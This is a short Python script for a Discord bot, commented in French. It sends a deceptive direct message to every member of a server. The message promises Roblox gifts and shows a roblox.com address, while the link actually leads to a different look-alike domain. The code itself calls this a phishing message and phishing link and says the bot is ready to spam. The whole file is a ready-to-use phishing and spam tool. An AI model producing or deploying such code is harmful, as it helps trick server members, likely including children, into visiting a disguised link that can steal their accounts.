import discord
from discord.ext import commands

# ================= CONFIGURATION =================
TOKEN = "TON_TOKEN_ICI" # Remplace TON_TOKEN_ICI par ton token copié à l'étape 1
MESSAGE = "HEY ! va m'ajouter sur Roblox et envoie moi un message sur le jeu ! plein de cadeau a gagner !! [https*:*//www.roblox.com/users/8024034859/profile](https://rblx.pk/Sas-k84t)
# =================================================

intents = discord.Intents.default()
intents.members = True  # Permet au bot de voir tous les membres du serveur

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Le bot {bot.user} est connecté et prêt à spammer !')
    print('Tape !mpall dans un salon textuel du serveur pour envoyer les MP.')

@bot.command()
async def mpall(ctx):
    """Envoie le message de phishing à tous les membres du serveur"""
    count = 0
    async for member in ctx.guild.members:
        if member.bot: continue # Le bot ne s'envoie pas de MP à lui-même
        try:
            await member.send(MESSAGE) # Envoie ton message exact ici
            count += 1
            print(f"Envoyé à {member.name} ✅")
        except discord.Forbidden: 
            print(f"Échec pour {member.name} (MP fermés) ❌")

    await ctx.send(f"🚀 Terminé ! {count} personnes ont reçu ton lien de phishing !")

bot.run(TOKEN)
